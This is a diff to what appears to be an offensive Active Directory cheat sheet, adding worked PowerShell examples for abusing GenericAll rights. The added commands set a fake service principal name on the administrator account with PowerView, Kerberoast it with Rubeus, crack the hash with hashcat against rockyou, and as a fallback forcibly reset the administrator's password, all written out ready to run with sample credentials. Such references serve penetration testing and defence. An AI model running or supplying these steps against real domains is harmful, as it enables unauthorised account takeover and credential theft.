@@ -229,13 +229,33 @@ GenericAll
 Import-Module .\PowerView.ps1
 <# valid credential #>
 $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<username>', $SecPassword)
 <# fake SPN #>
 Set-DomainObject -Credential $Cred -Identity <specific user> -SET @{serviceprincipalname='<service class>/<host>'} -Verbose
 <# Kerberoasting #>
 .\Rubeus.exe kerberoast /user:<specific user> /nowrap
 <# password recovery #>
 .\hashcat.exe -a 0 -m 13100 .\hash .\rockyou.txt
+```
+
+steps example
+
+```powershell
+$User = 'VITAMIN\Ted';$Pass = ConvertTo-SecureString 'P@ssword789' -AsPlainText -Force;$Cred = New-Object System.Management.Automation.PSCredential($User, $Pass)
+
+Set-DomainObject -Credential $Cred -Identity administrator -SET @{serviceprincipalname='ANYNAME/test000'}
+
+.\Rubeus.exe kerberoast /user:administrator /nowrap /creduser:VITAMIN\Ted /credpassword:'P@ssword789' /spn:"ANYNAME/test000"
+```
+
+if we can't recovery password
+
+```powershell
+$User = 'VITAMIN\Ted';$Pass = ConvertTo-SecureString 'P@ssword789' -AsPlainText -Force;$Cred = New-Object System.Management.Automation.PSCredential($User, $Pass)
+<# change target user's password #>
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+Set-DomainUserPassword -Identity administrator -AccountPassword $UserPassword -Credential $Cred
 ```
 
 ### :open_file_folder: PowerView
